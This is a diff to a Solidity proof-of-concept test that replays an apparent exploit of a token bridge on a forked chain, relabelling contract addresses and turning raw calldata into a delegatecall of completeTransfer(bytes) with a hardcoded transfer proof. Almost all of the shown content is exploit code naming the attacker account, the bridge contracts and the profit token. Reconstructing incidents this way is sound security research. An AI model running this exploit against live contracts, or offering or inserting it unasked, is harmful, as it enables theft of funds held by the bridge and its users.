@@ -23,7 +23,7 @@ import {LumosPoCBase} from "./LumosPoCBase.sol";
 
 contract AttackTest is LumosPoCBase {
     address constant ATTACKER_EOA = LumosAddresses.attacker_eoa;
-    address constant ATTACK_CONTRACT = LumosAddresses.attack_contract;
+    address constant ATTACK_CONTRACT = LumosAddresses.TokenBridge;
     uint256 constant FORK_BLOCK = 25207241;
     uint256 constant TX_TIMESTAMP = 1780132679;
     uint256 constant TX_BLOCK_NUMBER = 25207242;
@@ -81,22 +81,23 @@ contract OurAttack {
         _markCallback(0);
         {
             bytes memory delegateData = abi.encodeWithSignature("implementation()"); // observed selector 0x5c60da1b
-            (bool ok,) = LumosAddresses.A_0F8439_EEAB.delegatecall(delegateData);
+            (bool ok,) = LumosAddresses.BridgeImplementation.delegatecall(delegateData);
             require(ok, "delegatecall failed"); // delegatecall implementation()
         }
         {
             bytes memory delegateData = abi.encodeWithSignature("implementation()"); // observed selector 0x5c60da1b
-            (bool ok,) = LumosAddresses.A_0F8439_EEAB.delegatecall(delegateData);
+            (bool ok,) = LumosAddresses.BridgeImplementation.delegatecall(delegateData);
             require(ok, "delegatecall failed"); // delegatecall implementation()
         }
     }
 
     function _attack() internal {
         {
-            bytes memory observedCallData =
-                hex"c68785190000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000017a01000000000300db1be613ab89b52aa6b70d6e005fcb2304840dbf0ca2731f15313e5c72f95ae422c76d4be67c97d26c499a8bf7e63c6dc820c194d791d53596d59fc668ceea8e0101df38e83a68db1d6584b7e3234fe8452ded4df53359876a81695ad92dd1d338e5381601582000f3415b2f280a98dd282f716ba6d41bd066318f433ca1c943d7090103412bbba05d84388d49a6cc63efc84df531fc15c91ca7d8b0115d7dbd61cea9903f483d59bd98061503501a5bd47380195b8c94b88cff51f88b59060e84dd87f2006a1a9d3439e3ed8a00ff00027f42f8e21128e70c7a30098a32c5c388de7eb4ffc6ef7dd86f72e8e11acc480000000000000f423dcd010000000000000000000000000000000000000000000000000004e332e5092798000000000000000000000000000000000000000000000000000000000000000000ff00146681ebc82551fe52fdb48e65872e85a3ae06921d0000000000000000000000000000000000000000000000000000000000000000000000000000"; // artifact calldata preserved: pseudocode raw_call action_0004 line 67 requires exact artifact calldata
-            (bool ok,) = LumosAddresses.A_0F8439_EEAB.delegatecall(observedCallData);
-            require(ok, "observed selector 0xc6878519 failed");
+            bytes memory completeTransferProof =
+                hex"01000000000300db1be613ab89b52aa6b70d6e005fcb2304840dbf0ca2731f15313e5c72f95ae422c76d4be67c97d26c499a8bf7e63c6dc820c194d791d53596d59fc668ceea8e0101df38e83a68db1d6584b7e3234fe8452ded4df53359876a81695ad92dd1d338e5381601582000f3415b2f280a98dd282f716ba6d41bd066318f433ca1c943d7090103412bbba05d84388d49a6cc63efc84df531fc15c91ca7d8b0115d7dbd61cea9903f483d59bd98061503501a5bd47380195b8c94b88cff51f88b59060e84dd87f2006a1a9d3439e3ed8a00ff00027f42f8e21128e70c7a30098a32c5c388de7eb4ffc6ef7dd86f72e8e11acc480000000000000f423dcd010000000000000000000000000000000000000000000000000004e332e5092798000000000000000000000000000000000000000000000000000000000000000000ff00146681ebc82551fe52fdb48e65872e85a3ae06921d0000000000000000000000000000000000000000000000000000000000000000";
+            bytes memory delegateData = abi.encodeWithSignature("completeTransfer(bytes)", completeTransferProof); // observed selector 0xc6878519
+            (bool ok,) = LumosAddresses.BridgeImplementation.delegatecall(delegateData);
+            require(ok, "delegatecall failed"); // delegatecall completeTransfer(bytes)
         }
     }
 
@@ -202,14 +203,14 @@ struct LumosObservedCall {
 
 library LumosAddresses {
     address internal constant ZERO = address(0);
-    address internal constant A_01E82B_12A8 = 0x01e82b67367dE9f805E55de730D5007a752912A8; // LumosAddresses.A_01E82B_12A8 = 0x01e82b67367de9f805e55de730d5007a752912a8 label=unresolved roles=observed_address|recipient source=unresolved confidence=low
-    address internal constant A_0F8439_EEAB = 0x0F843945075DF4EA9C8a21f0e0CcFD5eB073eEAb; // LumosAddresses.A_0F8439_EEAB = 0x0f843945075df4ea9c8a21f0e0ccfd5eb073eeab label=unresolved roles=code_contract|recipient source=unresolved confidence=low
-    address internal constant attack_contract = 0x579a3bDE631c3d8068CbFE3dc45B0F14EC18dD43; // address(this) = 0x579a3bde631c3d8068cbfe3dc45b0f14ec18dd43 label=attack_contract roles=asset|attacker_callback_contract|attacker_contract|attacker_entry_contract|code_contract|contract|localized_contract|observed_address|storage_contract source=localize.localized_call_graph confidence=high
-    address internal constant ALPH = 0x590F820444fA3638e022776752c5eEF34E2F89A6; // LumosAddresses.ALPH = 0x590f820444fa3638e022776752c5eef34e2f89a6 label=ALPH token_symbol=ALPH roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|sender|token_related source=asset_delta.profit_candidates confidence=medium
+    address internal constant Wormhole = 0x01e82b67367dE9f805E55de730D5007a752912A8; // LumosAddresses.Wormhole = 0x01e82b67367de9f805e55de730d5007a752912a8 label=Wormhole roles=observed_address|recipient source=etherscan_v2 confidence=high
+    address internal constant BridgeImplementation = 0x0F843945075DF4EA9C8a21f0e0CcFD5eB073eEAb; // LumosAddresses.BridgeImplementation = 0x0f843945075df4ea9c8a21f0e0ccfd5eb073eeab label=BridgeImplementation roles=code_contract|recipient source=etherscan_v2 confidence=high
+    address internal constant TokenBridge = 0x579a3bDE631c3d8068CbFE3dc45B0F14EC18dD43; // address(this) = 0x579a3bde631c3d8068cbfe3dc45b0f14ec18dd43 label=TokenBridge roles=asset|attacker_callback_contract|attacker_contract|attacker_entry_contract|code_contract|contract|localized_contract|observed_address|storage_contract source=etherscan_v2 confidence=high
+    address internal constant ALPH = 0x590F820444fA3638e022776752c5eEF34E2F89A6; // LumosAddresses.ALPH = 0x590f820444fa3638e022776752c5eef34e2f89a6 label=BridgeToken token_symbol=ALPH roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|sender|token_related source=etherscan_v2 confidence=high
     address internal constant attacker_eoa = 0x6681ebC82551fE52fDB48E65872e85a3ae06921d; // LumosAddresses.attacker_eoa = 0x6681ebc82551fe52fdb48e65872e85a3ae06921d label=attacker_eoa roles=attacker_eoa|contract|economic_holder|observed_address|profit_holder|recipient|sender source=tx_metadata.from confidence=high
     address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8; // LumosAddresses.BalancerVault = 0xba12222222228d8ba445958a75a0704d566bf2c8 label=BalancerVault roles=known_protocol source=poc_sketch.known_addresses confidence=high
 }
 
-interface IContract_01E82B_12A8 {
+interface IWormhole {
     function parseAndVerifyVM(bytes calldata) external view;
 }
